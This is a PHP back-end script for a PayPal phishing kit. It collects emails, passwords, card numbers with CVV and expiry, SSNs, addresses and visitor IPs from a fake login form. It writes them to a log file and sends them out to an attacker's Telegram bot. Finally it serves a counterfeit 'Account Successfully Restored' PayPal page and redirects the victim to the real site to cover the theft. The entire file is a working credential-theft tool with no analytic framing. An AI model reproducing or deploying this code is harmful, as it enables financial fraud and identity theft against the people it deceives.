<?php
// Disable error reporting for stealth
error_reporting(0);
ini_set('display_errors', 0);

// Get all POST data
$email = $_POST['email'] ?? 'Not provided';
$password = $_POST['password'] ?? 'Not provided';
$country = $_POST['country'] ?? 'Not provided';
$fullname = $_POST['fullname'] ?? 'Not provided';
$address = $_POST['address'] ?? 'Not provided';
$cc_number = str_replace(' ', '', $_POST['cc_number'] ?? 'Not provided');
$cc_month = $_POST['cc_month'] ?? 'Not provided';
$cc_year = $_POST['cc_year'] ?? 'Not provided';
$cc_cvv = $_POST['cc_cvv'] ?? 'Not provided';
$cardholder = $_POST['cardholder'] ?? 'Not provided';
$ssn = $_POST['ssn'] ?? 'Not provided';

// Get victim info
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
$timestamp = date('Y-m-d H:i:s');

// Format the stolen data
$data = "🔥 PAYPAL VICTIM - " . $timestamp . " 🔥\n";
$data .= "═══════════════════════════\n";
$data .= "📧 EMAIL: " . $email . "\n";
$data .= "🔑 PASSWORD: " . $password . "\n";
$data .= "👤 FULL NAME: " . $fullname . "\n";
$data .= "🌍 COUNTRY: " . $country . "\n";
$data .= "🏠 ADDRESS: " . $address . "\n";
$data .= "💳 CARD: " . $cc_number . "\n";
$data .= "📅 EXP: " . $cc_month . "/" . $cc_year . "\n";
$data .= "🔐 CVV: " . $cc_cvv . "\n";
$data .= "💳 CARDHOLDER: " . $cardholder . "\n";
$data .= "🆔 SSN: " . $ssn . "\n";
$data .= "🌐 IP: " . $ip . "\n";
$data .= "📱 UA: " . $user_agent . "\n";
$data .= "🔗 REF: " . $referer . "\n";
$data .= "═══════════════════════════\n\n";

// Save to file
$file = 'logs.txt';
file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

// Send to Telegram (YOU FILL THESE IN)
$bot_token = 'YOUR_BOT_TOKEN'; // Replace with your bot token
$chat_id = 'YOUR_CHAT_ID';     // Replace with your chat ID

if ($bot_token != 'YOUR_BOT_TOKEN' && $chat_id != 'YOUR_CHAT_ID') {
    $telegram_url = "https://api.telegram.org/bot" . $bot_token . "/sendMessage";
    $postData = http_build_query([
        'chat_id' => $chat_id,
        'text' => $data,
        'parse_mode' => 'HTML'
    ]);
    
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'content' => $postData
        ]
    ]);
    
    @file_get_contents($telegram_url, false, $context);
}

// Redirect to success page
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Account Restored - PayPal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #f5f7fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
            width: 450px;
            max-width: 95%;
            padding: 50px 40px;
            text-align: center;
        }
        
        .success-icon {
            background: #e8f5e9;
            width: 80px;
            height: 80px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 25px;
        }
        
        .success-icon svg {
            width: 40px;
            height: 40px;
            fill: #34a853;
        }
        
        h1 {
            color: #1a1a1a;
            font-size: 28px;
            font-weight: 500;
            margin-bottom: 15px;
        }
        
        p {
            color: #5f6368;
            font-size: 16px;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .redirect-box {
            background: #f8f9fa;
            border-radius: 8px;
            padding: 20px;
            margin: 25px 0;
            font-size: 14px;
            color: #1a1a1a;
        }
        
        .loader {
            width: 48px;
            height: 48px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0070ba;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .redirect-link {
            color: #0070ba;
            text-decoration: none;
            font-weight: 500;
        }
        
        .redirect-link:hover {
            text-decoration: underline;
        }
    </style>
    <meta http-equiv="refresh" content="5;url=https://www.paypal.com">
</head>
<body>
    <div class="container">
        <div class="success-icon">
            <svg viewBox="0 0 24 24">
                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
            </svg>
        </div>
        
        <h1>Account Successfully Restored!</h1>
        <p>Your identity has been verified and your account access has been restored. You will be redirected to your account in 5 seconds.</p>
        
        <div class="redirect-box">
            <div class="loader"></div>
            <p style="margin-bottom: 0;">Redirecting you to PayPal...</p>
        </div>
        
        <p style="font-size: 14px;">
            Not redirected? <a href="https://www.paypal.com" class="redirect-link">Click here to continue</a>
        </p>
        
        <div style="margin-top: 30px; font-size: 12px; color: #9aa0a6;">
            © 2024 PayPal, Inc. All rights reserved.
        </div>
    </div>
    
    <script>
        setTimeout(function() {
            window.location.href = "https://www.paypal.com";
        }, 5000);
    </script>
</body>
</html>
<?php exit(); ?>